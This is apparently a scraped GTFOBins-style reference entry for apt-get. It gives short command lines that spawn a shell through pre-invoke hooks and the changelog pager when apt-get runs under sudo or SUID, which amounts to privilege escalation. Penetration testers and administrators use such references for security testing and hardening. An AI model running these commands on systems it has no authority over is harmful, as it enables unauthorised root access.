title: apt-get
html:
apt-get

Inherit

Context: sudo, unprivileged

apt-get changelog apt

Shell

Context: sudo, suid

echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl

Context: sudo, suid

apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
excerpt: apt-get Inherit Context: sudo, unprivileged apt-get changelog apt Shell Context: sudo, suid echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file apt-get -y install -c /
